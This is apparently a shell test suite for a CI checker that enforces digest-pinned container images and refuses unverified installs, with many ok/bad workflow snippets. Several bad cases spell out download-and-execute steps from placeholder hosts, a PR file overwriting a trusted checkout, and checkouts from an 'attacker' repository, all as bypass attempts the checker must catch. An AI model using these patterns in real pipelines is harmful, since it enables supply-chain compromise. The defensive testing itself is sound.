case_ r21-b01-build-and-echo-bad bad "$(rb 'docker build -t alpine:latest . < /__missing_input__ && echo built
          docker run alpine:latest')" "$DF"
case_ r21-b01-build-piped-to-cat-bad bad "$(rb 'docker build -t alpine:latest . < /__missing_input__ | cat
          docker run alpine:latest')" "$DF"
case_ r21-b01-set-plus-e-bad bad "$(rb 'set +e
          docker build -t alpine:latest . < /__missing_input__
          docker run alpine:latest')" "$DF"
case_ r21-b01-continue-on-error-step-bad bad "$head
    steps:
      - continue-on-error: true
        run: docker build -t alpine:latest .
      - run: docker run alpine:latest" "$DF"
case_ r21-b02-multiline-pipeline-bad bad "$(rb 'docker build -t alpine:latest . |
          docker run --rm -i alpine:latest cat')" "$DF"
case_ r21-b03-xargs-sudo-docker-bad bad "$(rb "printf '' | xargs -r sudo docker build -t alpine:latest .
          docker run alpine:latest")" "$DF"
case_ r21-b04-call-check-bad bad "$(rb 'docker buildx build --load --call=check -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r21-b04-load-false-bad bad "$(rb 'docker buildx build --load=false -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r21-b05-nested-loop-rebinds-bad bad "$(rb 'for v in latest; do
            for v in debug; do
              docker build -t "alpine:$v" .
            done
          done
          docker run alpine:latest')" "$DF"
case_ r21-b06-global-option-run-in-loop-bad bad "$(rb 'for v in 3.20 latest; do
            docker build -t "alpine:$v" .
            docker --debug run --rm alpine:latest
          done')" "$DF"
case_ r21-b07-podman-build-docker-run-bad bad "$(rb 'podman build -t docker.io/library/alpine:latest .
          docker run docker.io/library/alpine:latest')" "$DF"
case_ r21-b08-equivalent-name-rmi-bad bad "$(rb 'docker build -t alpine:latest .
          docker rmi docker.io/library/alpine:latest
          docker run alpine:latest')" "$DF"
case_ r21-b09-docker-load-bad bad "$(rb 'docker build -t alpine:latest .
          docker load -i image.tar
          docker run alpine:latest')" "$DF"
case_ r21-b10-tmp-copy-modified-sed-bad bad "$head
    steps:
      - run: |
          mkdir -p /tmp/policy
          git show origin/main:bin/tool.sh > /tmp/policy/tool.sh
      - run: sed -i 's/echo hi/docker run alpine:latest/' /tmp/policy/tool.sh
      - run: bash /tmp/policy/tool.sh" "$mkdir_bin"
case_ r21-b10-tmp-copy-replaced-cp-bad bad "$head
    steps:
      - run: |
          mkdir -p /tmp/policy
          git show origin/main:bin/tool.sh > /tmp/policy/tool.sh
      - run: cp replacement.sh /tmp/policy/tool.sh
      - run: bash /tmp/policy/tool.sh" "$mkdir_bin"
# controls that must keep passing
case_ r21-control-standalone-lines-localtrust-removed-bad bad "$(rb 'docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r21-control-semicolon-standalone-localtrust-removed-bad bad "$(rb 'docker build -t alpine:latest . ; docker run alpine:latest')" "$DF"
case_ r21-control-set-euo-localtrust-removed-bad bad "$(rb 'set -euo pipefail
          docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r21-control-podman-all-pinned-ok ok "$(rb 'podman run --rm docker.io/library/alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 true')"

# --- r22 (Sonnet 3 blockers): a quote that spans lines, a step that runs after a failure, and a shell without errexit
case_ r22-b01-fake-build-in-multiline-string-bad bad "$head
    steps:
      - run: |
          test -f nothing && docker build -t alpine:latest . ; echo \"
          docker build -t alpine:latest .
          \"
          docker run --rm alpine:latest true" "$DF"
case_ r22-b02-use-in-always-step-bad bad "$head
    steps:
      - run: docker build -t alpine:latest .
      - if: always()
        run: docker run --rm alpine:latest true" "$DF"
case_ r22-b02-use-in-failure-step-bad bad "$head
    steps:
      - run: docker build -t alpine:latest .
      - if: \${{ failure() }}
        run: docker run --rm alpine:latest true" "$DF"
case_ r22-b02-use-in-cancelled-step-bad bad "$head
    steps:
      - run: docker build -t alpine:latest .
      - if: \${{ cancelled() }}
        run: docker run --rm alpine:latest true" "$DF"
case_ r22-b03-shell-no-errexit-bad bad "$head
    defaults:
      run:
        shell: bash {0}
    steps:
      - run: |
          docker build -t alpine:latest .
          docker run --rm alpine:latest true" "$DF"
case_ r22-r1-set-plus-x-plus-e-bad bad "$(rb 'set +x +e
          docker build -t alpine:latest . < /__missing__
          docker run alpine:latest')" "$DF"
# controls
case_ r22-control-if-success-step-localtrust-removed-bad bad "$head
    steps:
      - run: docker build -t alpine:latest .
      - if: success()
        run: docker run --rm alpine:latest true" "$DF"
case_ r22-control-shell-bash-e-localtrust-removed-bad bad "$head
    steps:
      - shell: bash -e {0}
        run: |
          docker build -t alpine:latest .
          docker run --rm alpine:latest true" "$DF"
case_ r22-control-buildkit-env-prefix-localtrust-removed-bad bad "$(rb 'DOCKER_BUILDKIT=1 docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
case_ r22-control-github-expression-localtrust-removed-bad bad "$(rb 'echo built ${{ github.sha }}
          docker build -t alpine:latest .
          docker run alpine:latest')" "$DF"
# fail closed (declared): a closed multi-line quoted string no longer grants local trust (the text inside it cannot be told from commands line by line)
# --- r22 removal (advisor 0080, owner Oct 3: "a simple parse"): NO image name this job built or tagged is trusted. Every case named
# *-localtrust-removed-bad above was a feature test ("a name the job made earlier is ours"); 22 review rounds kept finding one more way for
# a hand-written tracker to be wrong about it, and no real workflow used it (the real repo is at 0 findings without it). A script that
# builds an image runs it by its image id or digest; the build itself is still fully checked (its FROM lines, context, Dockerfile).
case_ r23-iidfile-run-ok ok "$(rb 'docker build --iidfile "$RUNNER_TEMP/iid" .
          IID=$(cat "$RUNNER_TEMP/iid")
          docker run --rm "$IID" true')" "$DF"
case_ r23-build-only-ok ok "$(rb 'docker build -t alpine:latest .')" "$DF"
case_ r23-build-with-unpinned-from-bad bad "$(rb 'docker build -t alpine:latest .')" "printf 'FROM alpine:3.20\n' > Dockerfile"
case_ r23-run-by-name-after-build-bad bad "$(rb 'docker build -t myapp .
          docker run myapp')" "$DF"
case_ r23-tag-of-local-name-bad bad "$(rb 'docker build -t myapp .
          docker tag myapp myapp:v1')" "$DF"
case_ r23-run-pinned-digest-ok ok "$(rb 'docker run --rm alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 true')"

# --- r23 (Sonnet R1): a variable assigned a LITERAL unpinned name in the same script is just that name, and the checker can read it
case_ r23-var-literal-unpinned-run-bad bad "$(rb 'IMG=ubuntu:latest
          docker run --rm "$IMG" true')"
case_ r23-var-literal-braced-bad bad "$(rb 'IMG=ubuntu:latest
          docker run --rm ${IMG} true')"
case_ r23-var-literal-quoted-bad bad "$(rb 'IMG="ubuntu:latest"
          docker pull "$IMG"')"
case_ r23-for-loop-literal-pull-bad bad "$(rb 'for i in alpine busybox; do
            docker pull "$i"
          done')"
case_ r23-var-literal-tag-source-bad bad "$(rb 'SRC=alpine:3.20
          docker tag $SRC foo')"
case_ r23-removed-local-trust-bypass-by-variable-bad bad "$(rb 'docker build -t foo .
          N=foo
          docker run $N')" "$DF"
case_ r23-var-one-of-two-assignments-unpinned-bad bad "$(rb 'IMG=alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667
          IMG=ubuntu:latest
          docker run "$IMG" true')"
case_ r23-var-digest-ok ok "$(rb 'IMG=alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667
          docker run --rm "$IMG" true')"
case_ r23-var-from-substitution-ok ok "$(rb 'IMG=$(cat "$RUNNER_TEMP/iid")
          docker run --rm "$IMG" true')"
case_ r23-var-from-other-variable-ok ok "$(rb 'IMG="$OTHER"
          docker run --rm "$IMG" true')"
case_ r23-for-loop-digests-ok ok "$(rb 'for i in alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667; do
            docker pull "$i"
          done')"

case_ r23-var-of-docker-options-ok ok "$(rb 'AUTH="-e USER=acc -e PASS=x"
          docker run --rm $AUTH alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 true')"

# --- r23 (Codex 9 blockers, in the checker's OTHER features): Dockerfile parsing, build flags, option variables, xargs, image tag, --image frontends, installs
PIN=alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667
case_ r23c-b01-escape-directive-hides-from-bad bad "$(rb 'docker build .')" "printf '# escape=\\\\\nFROM alpine:latest\n' > Dockerfile"
case_ r23c-b01-backtick-escape-continuation-ok ok "$(rb 'docker build .')" "printf '# escape=\`\nFROM $PIN\nRUN echo a \`\n  b\n' > Dockerfile"
case_ r23c-b01-comment-inside-continuation-ok ok "$(rb 'docker build .')" "printf 'FROM $PIN\nRUN echo a \\\\\n# a comment\n  b\n' > Dockerfile"
case_ r23c-b02-attached-tag-wrong-context-bad bad "$(rb 'docker build -tmyapp subdir')" "mkdir subdir; printf 'FROM scratch\n' > Dockerfile; printf 'FROM alpine:latest\n' > subdir/Dockerfile"
case_ r23c-b02-attached-tag-right-context-ok ok "$(rb 'docker build -tmyapp subdir')" "mkdir subdir; printf 'FROM alpine:latest\n' > Dockerfile; printf 'FROM scratch\n' > subdir/Dockerfile"
case_ r23c-b03-empty-template-substitution-bad bad "$(rb 'SUFFIX=""
          docker build -f "Dockerfile${SUFFIX}" .')" "printf 'FROM alpine:latest\n' > Dockerfile; printf 'FROM scratch\n' > Dockerfile.prod"
case_ r23c-b04-options-variable-hides-image-bad bad "$(rb 'RUN_OPTS=--rm
          docker run $RUN_OPTS alpine:latest')"
case_ r23c-b04-options-array-hides-image-bad bad "$(rb 'RUN_OPTS=(--rm)
          docker run "${RUN_OPTS[@]}" alpine:latest')"
case_ r23c-b04-options-variable-then-digest-ok ok "$(rb "RUN_OPTS=--rm
          docker run \$RUN_OPTS $PIN true")"
case_ r23c-b05-xargs-supplies-image-bad bad "$(rb "printf '%s\n' alpine:latest | xargs -n1 docker pull")"
case_ r23c-b05-docker-run-help-ok ok "$(rb 'docker run --help')"
case_ r23c-b07-image-tag-alias-bad bad "$(rb 'docker image tag alpine:latest myapp:latest')"
case_ r23c-b07-image-tag-from-digest-ok ok "$(rb "docker image tag $PIN myapp:latest")"
case_ r23c-b08-kind-image-flag-bad bad "$(rb 'kind create cluster --image kindest/node:v1.34.0')"
case_ r23c-b08-kubectl-run-image-bad bad "$(rb 'kubectl run probe --image=alpine:latest --restart=Never -- sleep 60')"
case_ r23c-b08-kubectl-create-deployment-image-bad bad "$(rb 'kubectl create deployment web --image alpine:latest')"
case_ r23c-b08-kind-image-digest-ok ok "$(rb "kind create cluster --image kindest/node@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667")"
case_ r23c-b09-download-install-path-bad bad "$(rb 'curl -fsSL https://github.com/sigstore/cosign/releases/download/v2.4.1/cosign-linux-amd64 -o /tmp/cosign
          sudo install -m 0755 /tmp/cosign /usr/local/bin/cosign
          cosign version')"
case_ r23c-b09-download-mv-then-bare-name-bad bad "$(rb 'curl -fsSL https://example.org/tool -o /tmp/tool
          mv /tmp/tool /usr/local/bin/tool
          tool --version')"
case_ r23c-b09-install-of-committed-file-ok ok "$(rb 'sudo install -m 0755 bin/tool.sh /usr/local/bin/tool
          tool --version')" "mkdir -p bin; printf '#!/usr/bin/env bash\necho hi\n' > bin/tool.sh"

# --- r24 (Codex, the cheap in-scope ones)
case_ r24-help-anywhere-does-not-hide-the-image-bad bad "$(rb 'docker run --rm --help alpine:latest')"
case_ r24-run-help-alone-ok ok "$(rb 'docker run --help')"
case_ r24-empty-options-variable-hides-image-bad bad "$(rb 'RUN_OPTS=""
          docker run $RUN_OPTS alpine:latest')"
case_ r24-empty-options-array-hides-image-bad bad "$(rb 'RUN_OPTS=()
          docker run "${RUN_OPTS[@]}" alpine:latest')"
case_ r24-literal-assignment-in-committed-script-bad bad "$head
    steps:
      - run: bash bin/tool.sh" "mkdir -p bin; printf '#!/usr/bin/env bash\nIMG=ubuntu:latest\ndocker run --rm \"\$IMG\" true\n' > bin/tool.sh"
case_ r24-kubectl-image-through-literal-variable-bad bad "$(rb 'IMG=alpine:latest
          kubectl run probe --image="$IMG" --restart=Never')"
case_ r24-kind-image-through-literal-variable-bad bad "$(rb 'N=kindest/node:v1.34.0
          kind create cluster --image $N')"
case_ r24-docker-tag-source-substitution-bad bad "$(rb 'docker tag $(echo alpine:latest) myapp:latest')"
case_ r24-install-download-into-directory-bad bad "$(rb 'curl -fsSL https://example.org/tool -o /tmp/tool
          sudo install -m 0755 /tmp/tool /usr/local/bin/
          tool --version')"
case_ r24-install-t-directory-bad bad "$(rb 'curl -fsSL https://example.org/tool -o /tmp/tool
          sudo install -t /usr/local/bin /tmp/tool
          tool --version')"

case_ r24-scout-scan-of-literal-names-ok ok "$(rb 'for img in scoutcontrol/app:v1 ghcr.io/example/cache:selfcheck; do
            docker scout cves "$img" > out.json
          done')"

# --- r25 (consultation: Sonnet holds, with evidence that the real repo does not need it): a word MIXING a variable and a literal name, with no digest
case_ r25-mixed-registry-variable-literal-tag-bad bad "$(rb 'docker run --rm "$REG/tool:latest" true')"
case_ r25-mixed-pull-owner-variable-bad bad "$(rb 'docker pull "ghcr.io/$OWNER/tool:latest"')"
case_ r25-mixed-tag-variable-bad bad "$(rb 'docker run ubuntu:$TAG true')"
case_ r25-mixed-braced-tag-variable-bad bad "$(rb 'docker run ubuntu:${TAG} true')"
case_ r25-mixed-tag-source-bad bad "$(rb 'docker tag "$REG/x:1" y')"
case_ r25-mixed-with-digest-ok ok "$(rb 'docker run --rm "$REG/tool@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667" true')"
case_ r25-mixed-with-digest-variable-ok ok "$(rb 'docker pull "ghcr.io/$OWNER/tool@$DIGEST"')"
case_ r25-bare-variable-still-ok ok "$(rb 'docker run --rm "$IMAGE_REF" true')"
case_ r25-braced-array-variable-still-ok ok "$(rb 'docker run --rm "${IMAGES[0]}" true')"
case_ r25-mixed-tag-destination-ok ok "$(rb "docker tag $PIN localhost/fa-\${v}")"

# --- advisor 0198 (option A, fenced): a directory that an EARLIER step of the SAME job filled with actions/checkout of THIS repository at
# exactly the pull request's base sha (`ref: ${{ github.event.pull_request.base.sha }}`, a literal path) is main's copy: a committed script
# under it runs at a literal path in any interpreter (REQ-SUP-001's trusted checker). Every other shape stays refused.
BASE_REF='${{ github.event.pull_request.base.sha }}'
mk_trusted='mkdir -p bin && printf "print(1)\n" > bin/tool.py && printf "#!/usr/bin/env bash\necho hi\n" > bin/tool.sh'
co() { printf '      - uses: actions/checkout@%s # v7.0.1\n        with:\n%s\n' "$SHA" "$1"; }
case_ a-base-checkout-python-ok ok "$head
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
      - run: python3 trusted/bin/tool.py" "$mk_trusted"
case_ a-base-checkout-bash-ok ok "$head
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
      - run: bash trusted/bin/tool.sh" "$mk_trusted"
case_ a-base-checkout-dot-slash-ok ok "$head
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
      - run: python3 ./trusted/bin/tool.py" "$mk_trusted"
case_ a-other-ref-bad bad "$head
    steps:
$(co "          ref: \${{ github.event.pull_request.head.sha }}
          path: trusted")
      - run: python3 trusted/bin/tool.py" "$mk_trusted"
case_ a-no-ref-bad bad "$head
    steps:
$(co "          path: trusted")
      - run: python3 trusted/bin/tool.py" "$mk_trusted"
case_ a-other-repository-bad bad "$head
    steps:
$(co "          repository: attacker/x
          ref: $BASE_REF
          path: trusted")
      - run: python3 trusted/bin/tool.py" "$mk_trusted"
case_ a-checkout-after-the-run-bad bad "$head
    steps:
      - run: python3 trusted/bin/tool.py
$(co "          ref: $BASE_REF
          path: trusted")" "$mk_trusted"
case_ a-checkout-in-another-job-bad bad "on: push
jobs:
  one:
    runs-on: ubuntu-latest
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
  two:
    runs-on: ubuntu-latest
    steps:
      - run: python3 trusted/bin/tool.py" "$mk_trusted"
case_ a-variable-path-bad bad "$head
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
      - run: |
          checker=trusted
          python3 \"\$checker/bin/tool.py\"" "$mk_trusted"
case_ a-not-a-committed-file-bad bad "$head
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
      - run: python3 trusted/bin/missing.py" "$mk_trusted"
case_ a-root-checkout-bad bad "$head
    steps:
$(co "          ref: $BASE_REF")
      - run: python3 ./bin/tool.py extra && python3 trusted/bin/tool.py" "$mk_trusted"
case_ a-parent-path-bad bad "$head
    steps:
$(co "          ref: $BASE_REF
          path: ../trusted")
      - run: python3 ../trusted/bin/tool.py" "$mk_trusted"
case_ a-copy-over-the-checkout-bad bad "$head
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
      - run: |
          cp pr/evil.py trusted/bin/tool.py
          python3 trusted/bin/tool.py" "$mk_trusted"
case_ a-redirect-over-the-checkout-bad bad "$head
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
      - run: |
          echo 'import os' > trusted/bin/tool.py
          python3 trusted/bin/tool.py" "$mk_trusted"

# --- coverage cases (the 100% gate): branches of the readers that no workflow of this repository exercises
case_ cov-main-copy-in-a-for-loop-ok ok "$(rb 'for f in bin/g.sh; do
          gh api "repos/${GITHUB_REPOSITORY}/contents/${f}?ref=main" --jq .content | base64 -d > "${RUNNER_TEMP}/g.sh"
          done
          bash "${RUNNER_TEMP}/g.sh"')" "mkdir -p bin; printf 'docker run alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > bin/g.sh"
case_ cov-another-language-script-run-directly-ok ok "$(rb './bin/t')" "mkdir -p bin; printf '#!/usr/bin/env python3\\nprint(1)\\n' > bin/t; chmod +x bin/t"
case_ cov-scripts-nested-past-the-limit-bad bad "$(rb 'bash bin/a.sh')" "mkdir -p bin; for p in a:b b:c c:d d:e e:f; do printf 'bash bin/%s.sh\\n' \"\${p#*:}\" > bin/\${p%%:*}.sh; done; printf 'echo hi\\n' > bin/f.sh"

# --- R5 of round 26 (Codex r26 B1-B9, Sonnet B8/B9, option-A residuals): each case names the plain form it refuses (or the fixed form it still accepts)
DF2='mkdir -p pin-context; printf "FROM scratch\\n" > Dockerfile; printf "FROM alpine:latest\\n" > pin-context/Dockerfile'
case_ r26-b1-build-debug-flag-then-context-bad bad "$(rb 'docker build --debug pin-context')" "$DF2"
case_ r26-b1-build-clustered-qf-bad bad "$(rb 'docker build -qf pin-context/Dockerfile .')" "$DF2"
case_ r26-b1-build-compress-then-context-bad bad "$(rb 'docker build --compress pin-context')" "$DF2"
case_ r26-b1-build-unknown-option-bad bad "$(rb 'docker build --frobnicate .')" "$DF2"
case_ r26-b1-build-known-options-ok ok "$(rb 'docker build -q --debug -f pin-context/Dockerfile pin-context')" "mkdir -p pin-context; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > pin-context/Dockerfile"
case_ r26-b2-empty-assignment-then-literal-bad bad "$(rb 'RUN_OPTS=
          docker run $RUN_OPTS alpine:latest')"
case_ r26-b2-empty-assignment-then-digest-ok ok "$(rb 'RUN_OPTS=
          docker run $RUN_OPTS alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
case_ r26-b3-literal-array-bad bad "$(rb 'IMAGES=(alpine:latest)
          docker run "${IMAGES[0]}"')"
case_ r26-b4-kubectl-set-image-bad bad "$(rb 'kubectl set image deployment/web web=nginx:latest')"
case_ r26-b4-kubectl-set-image-digest-ok ok "$(rb 'kubectl set image deployment/web web=nginx@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
case_ r26-b4-k3d-short-image-bad bad "$(rb 'k3d cluster create demo -i rancher/k3s:v1.31.5-k3s1')"
case_ r26-b4-k3d-attached-image-bad bad "$(rb 'k3d cluster create demo -irancher/k3s:v1.31.5-k3s1')"
case_ r26-b4-k3d-image-digest-ok ok "$(rb 'k3d cluster create demo -i rancher/k3s@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"
case_ r26-b4-kind-config-bad bad "$(rb 'kind create cluster --config pin-kind.yaml')"
case_ r26-b5-kind-image-substitution-bad bad "$(rb 'kind create cluster --image "$(cat pin-image.txt)"')"
case_ r26-b5-kubectl-run-substitution-bad bad "$(rb 'kubectl run probe --image="$(echo alpine:latest)" --restart=Never')"
case_ r26-b6-oras-bad bad "$(rb 'oras cp --to-oci-layout docker.io/library/alpine:latest downloaded:latest')"
case_ r26-b6-helm-bad bad "$(rb 'helm upgrade --install pin-probe ./pin-chart --set image=alpine:latest')"
case_ r26-b7-pull-never-other-tag-bad bad "$(rb 'docker run --pull=never alpine:latest')"
case_ r26-b7-pull-never-localhost-ok ok "$(rb 'docker run --pull=never localhost/fa-production')"
case_ r26-b8-crane-pull-literal-variable-bad bad "$(rb 'IMG=alpine:latest
          crane pull "$IMG" out.tar')"
case_ r26-b8-crane-pull-mixed-word-bad bad "$(rb 'crane pull "$REG/x:latest" o.tar')"
case_ r26-b8-skopeo-literal-variable-bad bad "$(rb 'IMG=alpine:latest
          skopeo copy "docker://$IMG" oci:out:latest')"
case_ r26-b8-crane-pull-bare-variable-ok ok "$(rb 'crane pull "$IMG" o.tar')"
case_ r26-b8-skopeo-positional-parameter-ok ok "$(rb 'skopeo inspect "docker://$1"')"
case_ r26-b9-curl-clustered-o-then-install-bad bad "$(rb 'curl -fsSLo /tmp/cosign https://github.com/sigstore/cosign/releases/download/v2.4.1/cosign-linux-amd64
          sudo install -m 0755 /tmp/cosign /usr/local/bin/cosign
          cosign version')"
case_ r26-b9-curl-straight-into-path-bad bad "$(rb 'curl -fsSL -o /usr/local/bin/cosign https://github.com/sigstore/cosign/releases/download/v2.4.1/cosign-linux-amd64
          chmod +x /usr/local/bin/cosign
          cosign version')"
case_ r26-b9-wget-straight-into-path-bad bad "$(rb 'wget -qO /usr/local/bin/cosign https://github.com/sigstore/cosign/releases/download/v2.4.1/cosign-linux-amd64
          chmod +x /usr/local/bin/cosign
          cosign version')"
case_ r26-b9-curl-attached-o-then-copy-bad bad "$(rb 'curl -o/tmp/y https://e.example/y
          cp /tmp/y /usr/bin/y
          y version')"
case_ r26-b9-curl-remote-name-alone-ok ok "$(rb 'curl -fsSLO https://e.example/notes.txt')"
case_ a-later-checkout-into-the-same-path-bad bad "$head
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
$(co "          ref: \${{ github.event.pull_request.head.sha }}
          path: trusted")
      - run: python3 trusted/bin/tool.py" "$mk_trusted"
case_ a-later-checkout-without-ref-bad bad "$head
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
$(co "          path: trusted")
      - run: python3 trusted/bin/tool.py" "$mk_trusted"
# --- R5 follow-up (Codex r27 / Sonnet r27): the fixes' own gaps
case_ r27-b2-empty-assignment-before-semicolon-bad bad "$(rb 'RUN_OPTS=; docker run $RUN_OPTS alpine:latest')"
case_ r27-b3-indexed-array-assignment-bad bad "$(rb 'IMAGES[0]=alpine:latest
          docker run "${IMAGES[0]}"')"
case_ r27-b3-array-append-bad bad "$(rb 'IMAGES+=(alpine:latest)
          docker run "${IMAGES[0]}"')"
case_ r27-b3-loop-over-a-literal-array-bad bad "$(rb 'IMAGES=(alpine:latest busybox:latest)
          for i in "${IMAGES[@]}"; do docker pull "$i"; done')"
case_ r27-b3-loop-over-a-digest-array-ok ok "$(rb 'IMAGES=(alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667)
          for i in "${IMAGES[@]}"; do docker pull "$i"; done')"
case_ r27-b4-kubectl-namespace-flag-set-image-bad bad "$(rb 'kubectl -n production set image deployment/web web=nginx:latest')"
case_ r27-b4-kubectl-long-flag-set-image-bad bad "$(rb 'kubectl --namespace=prod --context kind-x set image deployment/web web=nginx:latest')"
case_ a-later-checkout-with-dot-slash-path-bad bad "$head
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
$(co "          repository: attacker/repo
          path: ./trusted")
      - run: python3 trusted/bin/tool.py" "$mk_trusted"
case_ a-later-checkout-into-a-subdirectory-bad bad "$head
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
$(co "          path: trusted/bin")
      - run: python3 trusted/bin/tool.py" "$mk_trusted"
case_ a-later-root-checkout-bad bad "$head
    steps:
$(co "          ref: $BASE_REF
          path: trusted")
$(co "          ref: main")
      - run: python3 trusted/bin/tool.py" "$mk_trusted"
# --- fix verification after R5 (Codex r28)
case_ r28-b2-kubectl-set-flag-image-bad bad "$(rb 'kubectl set -n production image deployment/web web=nginx:latest')"
case_ r28-b2-kubectl-set-flag-image-digest-ok ok "$(rb 'kubectl set -n production image deployment/web web=nginx@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667')"

# --- final verification (Codex r31 B1-B4): the same classes, one more plain spelling each
case_ r31-b1-build-options-in-an-array-bad bad "$(rb 'BUILD_OPTS=(-f pin-probe/Unpinned)
          docker build "${BUILD_OPTS[@]}" pin-probe')" "mkdir -p pin-probe; printf 'FROM scratch\\n' > pin-probe/Dockerfile; printf 'FROM alpine:latest\\n' > pin-probe/Unpinned"
case_ r31-b2-skopeo-source-variable-literal-bad bad "$(rb 'SRC=docker://alpine:latest
          skopeo copy "$SRC" docker-archive:/tmp/probe.tar')"
case_ r31-b2-skopeo-source-variable-digest-ok ok "$(rb 'SRC=docker://alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667
          skopeo copy "$SRC" docker-archive:/tmp/probe.tar')"
case_ r31-b3-kubectl-mixed-tag-bad bad "$(rb 'TAG=latest
          kubectl run probe --image="alpine:$TAG" --restart=Never')"
case_ r31-b4-curl-redirected-then-installed-bad bad "$(rb 'curl -fsSL https://example.org/releases/latest/tool > /tmp/tool
          sudo install -m 0755 /tmp/tool /usr/local/bin/tool
          tool --version')"
case_ r31-b4-curl-redirected-into-a-path-directory-bad bad "$(rb 'curl -fsSL https://example.org/releases/latest/tool > /usr/local/bin/tool
          chmod +x /usr/local/bin/tool
          tool --version')"

# --- narrow verification (Codex r32 B1, B2, B4): the incomplete spellings of the r31 fixes
case_ r32-b1-array-as-an-option-value-bad bad "$(rb 'BUILD_OPTS=(probe -f pin-probe/Unpinned)
          docker build --tag "${BUILD_OPTS[@]}" pin-probe')" "mkdir -p pin-probe; printf 'FROM scratch\\n' > pin-probe/Dockerfile; printf 'FROM alpine:latest\\n' > pin-probe/Unpinned"
case_ r32-b2-skopeo-indexed-source-bad bad "$(rb 'SRC=(docker://alpine:latest)
          skopeo copy "${SRC[0]}" docker-archive:/tmp/probe.tar')"
case_ r32-b4-curl-ampersand-redirect-then-installed-bad bad "$(rb 'curl -fsSL https://example.org/releases/latest/tool &> /tmp/tool
          sudo install -m 0755 /tmp/tool /usr/local/bin/tool
          tool --version')"
case_ r32-b4-curl-ampersand-redirect-into-a-path-directory-bad bad "$(rb 'curl -fsSL https://example.org/releases/latest/tool &> /usr/local/bin/tool
          chmod +x /usr/local/bin/tool
          tool --version')"

case_ r33-b1-ampersand-redirect-to-a-quoted-name-with-a-space-bad bad "$(rb 'curl -fsSL https://example.org/releases/latest/tool &> "/tmp/my tool"
          sudo install -m 0755 "/tmp/my tool" /usr/local/bin/tool
          tool --version')"
case_ r33-b1-ampersand-append-redirect-to-a-quoted-name-bad bad "$(rb 'curl -fsSL https://example.org/releases/latest/tool &>> "/tmp/my tool"
          sudo install -m 0755 "/tmp/my tool" /usr/local/bin/tool
          tool --version')"

echo "check-action-pins: $pass passed, $failn failed"
[ "$failn" -eq 0 ]
